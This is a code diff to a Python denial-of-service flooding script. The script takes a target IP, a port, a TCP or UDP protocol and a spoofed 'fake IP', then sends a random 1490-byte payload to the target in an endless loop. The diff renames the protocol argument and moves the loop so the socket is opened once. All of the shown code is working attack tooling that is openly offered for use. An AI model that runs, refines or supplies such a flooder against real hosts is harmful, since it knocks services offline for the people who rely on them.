@@ -54,14 +54,14 @@ def main():
 
   parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
   parser.add_argument('--PORT', '--P', type = int, default = '80', help = 'Port', required = True)
-  parser.add_argument('--protocol', '--p', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
+  parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
   parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fale IP')
 
   arguments = parser.parse_args()
 
   ip = arguments.TARGET
   port = arguments.PORT
-  protocol = arguments.protocol
+  protocol = arguments.PROTOCOL
   fale_ip = arguments.FAKEIP
 
   bytes = random._urandom(1490)
@@ -74,16 +74,16 @@ def main():
   #if sleep_time is None:
     #sleep_time = 2 
 def attack():
-  while True:
-    if protocol == "TCP": 
+  if protocol == "TCP": 
       s = socket(AF_INET, SOCK_STREAM)
 
-    elif protocol == "UDP":
-      s = socket(AF_INET, SOCK_DGRAM)
+  elif protocol == "UDP":
+    s = socket(AF_INET, SOCK_DGRAM)
   
-    else:
-      print("undefined protocol!, Ctrl + C to close!")
-      
+  else:
+    print("undefined protocol!, Ctrl + C to close!")
+    
+  while True: 
     s.connect((ip, port))
     s.send(bytes)
     #s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
